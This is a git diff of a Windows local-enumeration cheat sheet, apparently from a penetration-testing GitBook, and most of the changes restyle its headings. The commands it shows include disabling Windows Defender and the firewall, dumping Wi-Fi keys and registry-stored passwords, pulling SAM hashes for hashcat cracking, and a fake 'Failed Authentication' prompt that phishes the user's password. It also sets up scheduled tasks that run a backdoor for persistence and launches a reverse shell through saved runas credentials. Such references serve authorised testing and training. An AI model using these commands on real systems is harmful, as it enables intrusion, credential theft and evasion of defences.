@@ -1,18 +1,18 @@
-# Enumeration
+# ⭕ Local Enumeration
 
-## System Information
+## <mark style="color:red;">System Information</mark>
 
-### general system information
+### <mark style="color:orange;">general system information</mark>
 
 ```
 systeminfo
 ```
 
 {% hint style="info" %}
-one way to find out whether you are in a virtual environment or not is to check the output. for example the picture bellow is the output from a windows 10 machine in virtualbox:&#x20;
+one way to find out whether you are in a virtual environment or not is to check the output. for example the picture bellow is the output from a windows 10 machine in virtualbox:
 {% endhint %}
 
-![](<../../../.gitbook/assets/image (67).png>)
+![](<../../.gitbook/assets/image (67).png>)
 
 for OS name and version ( can add any other filter too ) :
 
@@ -33,9 +33,7 @@ set
 Get-ChildItem Env: | ft Key,Value
 ```
 
-
-
-### get a list of installed hot fixes
+### <mark style="color:orange;">get a list of installed hot fixes</mark>
 
 ```
 Get-HotFix
@@ -67,9 +65,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 driverquery | findstr Kernel
 ```
 
-
-
-### Kernel Exploits
+### <mark style="color:orange;">Kernel Exploits</mark>
 
 Extract the output of the systeminfo command:
 
@@ -91,9 +87,7 @@ Cross-reference results with compiled exploits:
 
 ​[https://github.com/abatchy17/WindowsExploit](https://github.com/abatchy17/WindowsExploits)
 
-
-
-### SNMP configurations
+### <mark style="color:orange;">SNMP configurations</mark>
 
 check to see if there is any SNMP services running and find valid community strings:
 
@@ -110,19 +104,19 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
 for more information on windows registry hive and 'reg' commands refer to[ this section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/windows/security-component/windows-registry) of the book.
 {% endhint %}
 
-### VNC configurations
+### <mark style="color:orange;">VNC configurations</mark>
 
 ```
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 ```
 
-### check  powershell version
+### <mark style="color:orange;">Check  Powershell Version</mark>
 
 ```
 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
 ```
 
-### navigate the registry with powershell
+### <mark style="color:orange;">Navigate the Registry with Powershell</mark>
 
 might require admin rights or higher privileges
 
@@ -131,7 +125,7 @@ PS C:\> cd HKLM:\
 PS HKLM:\> ls
 ```
 
-### get last system boot time
+### <mark style="color:orange;">Get Last System Boot Time</mark>
 
 ```
 $os = Get-WmiObject win32_operatingsystem $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime) Write-Output ("Last boot: " + $os.ConvertToDateTime($os.LastBootUpTime))
@@ -139,7 +133,7 @@ You can also run this single line to get last boot time
 systeminfo | more
 ```
 
-### powershell history <a href="powershell-history" id="powershell-history"></a>
+### <mark style="color:orange;">Powershell History</mark> <a href="#powershell-history" id="powershell-history"></a>
 
 ```
 ConsoleHost_history #Find the PATH where is saved
@@ -151,7 +145,7 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
-### file system drives
+### <mark style="color:orange;">Get File System Drives</mark>
 
 ```
 wmic logicaldisk get caption || fsutil fsinfo drives
@@ -160,21 +154,21 @@ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'St
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
-### mount / volumes
+### <mark style="color:orange;">mount / volumes</mark>
 
 ```
 mountvol
 ```
 
-## Logs and Audit Setting
+## <mark style="color:red;">Logs and Audit Setting</mark>
 
-### view system auditing setting
+### <mark style="color:orange;">view system auditing setting</mark>
 
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 
-### check if system logs are stored somewhere else:
+#### <mark style="color:green;">check if system logs are stored somewhere else:</mark>
 
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
@@ -187,7 +181,7 @@ wevtutil enum-logs
 wevtutil el
 ```
 
-### configuration for System log:
+### <mark style="color:orange;">configuration for System log</mark>
 
 ```
 wevtutil gl System
@@ -199,25 +193,27 @@ general application logging info:
 wevtutil gli Application
 ```
 
-### check credential guard:
+### <mark style="color:orange;">check credential guard</mark>
 
 ```
 reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
 ```
 
-### check cached credentials (domain):
+### <mark style="color:orange;">check cached credentials (domain)</mark>
 
 ```
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
 
-## check for AVs
+```
+Check for Defenses
+```
 
 ```
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
 ```
 
-### windows defender
+### <mark style="color:orange;">windows defender</mark>
 
 if you have privileges:
 
@@ -241,7 +237,7 @@ PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
-### applocker policy
+### <mark style="color:orange;">applocker policy</mark>
 
 ```
 Get-ApplockerPolicy -Effective -xml
@@ -250,13 +246,9 @@ $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
 
-Applocker Bypass:
+### ****[**Defense Evasion Techniques**](broken-reference)****
 
-* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
-* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
-* [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
-
-### check UAC
+### <mark style="color:orange;">check UAC</mark>
 
 ```
 reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
@@ -266,7 +258,7 @@ reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 
 {% embed url="https://github.com/hfiref0x/UACME" %}
 
-## Network and Connections
+## <mark style="color:red;">Network and Connections</mark>
 
 ```
 netstat -ano
@@ -276,7 +268,7 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
-### extract wifi password
+### <mark style="color:orange;">extract wifi password</mark>
 
 ```
 netsh wlan show profile
@@ -289,21 +281,21 @@ one-liner to extract all APs at once:
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
 
-### routing info:
+### <mark style="color:orange;">routing info</mark>
 
 ```
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
 
-### network shares
+### <mark style="color:orange;">network shares</mark>
 
 ```
 net share
 Find-DomainShare -ComputerDomain domain.local
 ```
 
-### firewall
+### <mark style="color:orange;">firewall</mark>
 
 ```
 # list firewall status and configs
@@ -329,7 +321,7 @@ netsh Advfirewall set allprofiles state off
 
 
 
-## Users and Groups
+## <mark style="color:red;">Users and Groups</mark>
 
 Get current username
 
@@ -338,14 +330,14 @@ echo %USERNAME% || whoami
 $env:username
 ```
 
-### list privileges
+### <mark style="color:orange;">list privileges</mark>
 
 ```
 whoami /priv
 whoami /groups
 ```
 
-### list all local users and groups
+### <mark style="color:orange;">list all local users and groups</mark>
 
 ```
 net user
@@ -364,7 +356,7 @@ dir C:\Users
 Get-ChildItem C:\Users
 ```
 
-### find local admins
+### <mark style="color:orange;">find local admins</mark>
 
 ```
 net localgroup Administrators 
@@ -389,31 +381,31 @@ net localgroup administrators
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
-### logged users/sessions
+### <mark style="color:orange;">logged users/sessions</mark>
 
 ```
 qwinsta
 klist sessions
 ```
 
-dump clipboard
+### <mark style="color:orange;">dump clipboard</mark>
 
 ```
 powershell -command "Get-Clipboard"
 ```
 
+## <mark style="color:red;">Software and Processes</mark>
 
+### <mark style="color:orange;">check 'always install elevated'</mark>
 
-## Software and Processes
-
-### check 'always install elevated' (both should be enabled):
+#### &#x20;(both should be enabled in order to be vulnerable)
 
 ```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
-### list running processes
+### <mark style="color:orange;">list running processes</mark>
 
 ```
 qprocess * 
@@ -448,7 +440,7 @@ tasklist /fi "imagename eq imageName"
 tasklist /fi "imagename eq firefox.exe"
 ```
 
-### Find the process running a specific service
+### <mark style="color:orange;">Find the process running a specific service</mark>
 
 ```
 tasklist /fi "services eq serviceName"
@@ -462,13 +454,15 @@ taskkill -f /pid 1337
 taskkill /IM notepad.exe
 ```
 
-### list processes running as "system"
+### <mark style="color:orange;">list processes running as "system"</mark>
 
 ```
 tasklist /v /fi "username eq system"
 ```
 
-### installed programs (might need higher privileges)
+### <mark style="color:orange;">check installed programs</mark>&#x20;
+
+#### (might need higher privileges)
 
 ```
 wmic product get name, version, vendor
@@ -480,21 +474,23 @@ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,Last
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
-### show system-wide updates
+### <mark style="color:orange;">show system-wide updates</mark>
 
 ```
 wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
 
-### uninstall software (if you have privileges)
+### <mark style="color:orange;">uninstall software</mark>
+
+#### &#x20;(if you have privileges)
 
 ```
 wmic product where name="<NAME>" call uninstall /INTERACTIVE:OFF
 ```
 
-## Services
+## <mark style="color:red;">Services</mark>
 
-### view/start/stop a service
+### <mark style="color:orange;">view/start/stop a service</mark>
 
 ```
 net start
@@ -540,7 +536,7 @@ To change the Path of the binary executed:
 reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
-### find all service executables
+### <mark style="color:orange;">find all service executables</mark>
 
 ```
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt
@@ -554,13 +550,13 @@ FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
 ```
 
-### search for unquoted service paths
+### <mark style="color:orange;">search for unquoted service paths</mark>
 
 ```
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 ```
 
-### check for weak service permissions
+### <mark style="color:orange;">check for weak service permissions</mark>
 
 ```
 accesschk.exe -accepteula -wuvc "Everyone" *
@@ -568,16 +564,18 @@ accesschk.exe -accepteula -wuvc "Users" *
 accesschk.exe -accepteula -wuvc "Authenticated Users" *
 ```
 
-## Scheduled Tasks
+## <mark style="color:red;">Scheduled Tasks</mark>
 
-### list scheduled tasks
+### <mark style="color:orange;">list scheduled tasks</mark>
 
 ```
 schtasks /query /fo LIST /v
 schtasks
 ```
 
-### add startup scheduled tasks (useful for persistence)
+### <mark style="color:orange;">add startup scheduled tasks</mark>&#x20;
+
+#### (useful for persistence)
 
 ```
 schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desktop\backdoor.exe"
@@ -585,11 +583,9 @@ schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desk
 schtasks /create /tn "MyCustomTask" /sc onstart /tr "C:\users\Administrator\Desktop\backdoor.exe"
 ```
 
+## <mark style="color:red;">Clear Text Credentials</mark>
 
-
-## Clear Text Credentials
-
-### search for 'password' keyword in registry hives
+### <mark style="color:orange;">search for 'password' keyword in registry hives</mark>
 
 ```
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -600,13 +596,13 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-### extract openssh keys from registry
+### <mark style="color:orange;">extract openssh keys from registry</mark>
 
 #### [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-####
 
-### find winlogon stored credentials (auto login)
+
+### <mark style="color:orange;">find winlogon stored credentials (auto login)</mark>
 
 ```
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
@@ -618,13 +614,13 @@ if you find anything you can connect to the target from kali machine with this c
 winexe -U 'admin%password123' //192.168.1.22 cmd.exe
 ```
 
-### find putty session stored credentials
+### <mark style="color:orange;">find putty session stored credentials</mark>
 
 ```
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 ```
 
-### search windows credential manager
+### <mark style="color:orange;">search windows credential manager</mark>
 
 ```
 cmdkey /list
@@ -636,7 +632,7 @@ to use windows "runas" feature to get a reverse shell:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe 
 ```
 
-### kindly asking user for credentials ( phishing )
+### <mark style="color:orange;">phishing user for credential</mark>
 
 ```
 powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
@@ -648,7 +644,7 @@ or
 powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
 ```
 
-### log files
+### <mark style="color:orange;">log files</mark>
 
 ```
 # IIS
@@ -658,7 +654,7 @@ C:\inetpub\logs\LogFiles\*
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-### OpenVPN credentials
+### <mark style="color:orange;">OpenVPN credentials</mark>
 
 ```
 Add-Type -AssemblyName System.Security
@@ -680,7 +676,7 @@ foreach ($item in $items)
 }
 ```
 
-### IIS web server configurations
+### <mark style="color:orange;">IIS web server configurations</mark>
 
 ```
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -692,7 +688,7 @@ Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorActio
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-### search files for credentials
+### <mark style="color:orange;">search files for credentials</mark>
 
 not as straight forward as linux, we first have to create a listing of all directories in the drive we want (usually C drive):
 
@@ -740,9 +736,7 @@ cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
 ```
 
-
-
-### SAM and SYSTEM backups
+### <mark style="color:orange;">SAM and SYSTEM backups</mark>
 
 The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. The files are locked while Windows is running. Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
 
@@ -763,13 +757,15 @@ you can try to crack the admin hash with hashcat:
 hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
 ```
 
-### Cloud Credentials <a href="cloud-credentials" id="cloud-credentials"></a>
+### <mark style="color:orange;">Cloud Credentials</mark> <a href="#cloud-credentials" id="cloud-credentials"></a>
+
+#### (AWS)
 
 ```
 ##From user home.aws\credentialsAppData\Roaming\gcloud\credentials.dbAppData\Roaming\gcloud\legacy_credentialsAppData\Roaming\gcloud\access_tokens.db.azure\accessTokens.json.azure\azureProfile.json
 ```
 
-### Tools that search for passwords <a href="tools-that-search-for-passwords" id="tools-that-search-for-passwords"></a>
+### <mark style="color:orange;">Tools that search for passwords</mark> <a href="#tools-that-search-for-passwords" id="tools-that-search-for-passwords"></a>
 
 ​[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim. [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page. [**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.
 
@@ -779,9 +775,9 @@ The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search 
 Import-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -ThoroughInvoke-SessionGopher -AllDomain -oInvoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p [email protected]
 ```
 
-## Files and Shares
+## <mark style="color:red;">Files and Shares</mark>
 
-### find files by name
+### <mark style="color:orange;">find files by name</mark>
 
 ```
 gdr -PSProvider 'FileSystem' | %{ls -r $_.root} 2>$null | where { $_.name -eq "flag.txt"} -verbose
@@ -793,7 +789,7 @@ find all DOC files in C drive
 Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\temp}
 ```
 
-### search for a string/regex in a file
+### <mark style="color:orange;">search for a string/regex in a file</mark>
 
 ```
 type [file] | find /i "[string]"
@@ -807,13 +803,13 @@ dir /b /s [directory]\[file]
 dir /b /s c:\wmic.exe
 ```
 
-### find all files with a particular name:
+### <mark style="color:orange;">find all files with a particular name</mark>
 
 ```
 Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
 ```
 
-### show drives and disk info
+### <mark style="color:orange;">show drives and disk info</mark>
 
 ```
 fsutil fsinfo
@@ -825,7 +821,7 @@ tree map of a drive
 tree C:\ /f /a > C:\output_of_tree.txt
 ```
 
-### find writable files
+### <mark style="color:orange;">find writable files</mark>
 
 ```
 accesschk.exe -uws "Everyone" "C:\Program Files"
@@ -835,7 +831,7 @@ Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone"}
 ```
 
-### check for weak file permissions
+### <mark style="color:orange;">check for weak file permissions</mark>
 
 ```
 accesschk.exe -uws "Everyone" "C:\Program Files" 
@@ -863,13 +859,10 @@ some important files to look for
 %WINDIR%\System32\drivers\etc\hosts
 ```
 
-### connect to a network share
+### <mark style="color:orange;">connect to a network share</mark>
 
 ```
-net use K: \\<IP address\share IE C or Admin>  
-net use K: \\192.168.31.53\C  <--this will connect to the K drive
+net use K: \\<IP address\share IE C or Admin>  
+net use K: \\192.168.31.53\C  <--this will connect to the K drive
 net use K: \\192.168.31.53\C$ /user:george P@$$Word34 
 ```
-
-
-
